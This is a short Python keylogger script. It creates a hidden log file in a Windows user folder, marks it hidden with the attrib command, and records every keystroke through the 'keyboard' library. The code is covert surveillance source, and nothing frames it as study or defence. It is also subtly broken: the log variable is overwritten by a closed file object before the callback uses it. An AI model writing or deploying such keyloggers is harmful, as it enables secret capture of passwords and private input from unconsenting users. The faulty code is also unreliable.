import keyboard
import subprocess

def on_key_press(event):
    with open(log, "a") as file:
        file.write("{}\n".format(event.name))


# Creating the log file nad hiding it
log = open("C:/Users/fadis/.log.txt", "x")
subprocess.run(["attrib", "+H", "C:/Users/fadis/.log.txt"], check=True)

# Writing the First line to the log file and closes it
log.write("Beginning of logfile")
log.close()

# Registering the Keystrokes
keyboard.on_press(on_key_press)

# Review what the fuck this line does
keyboard.wait()
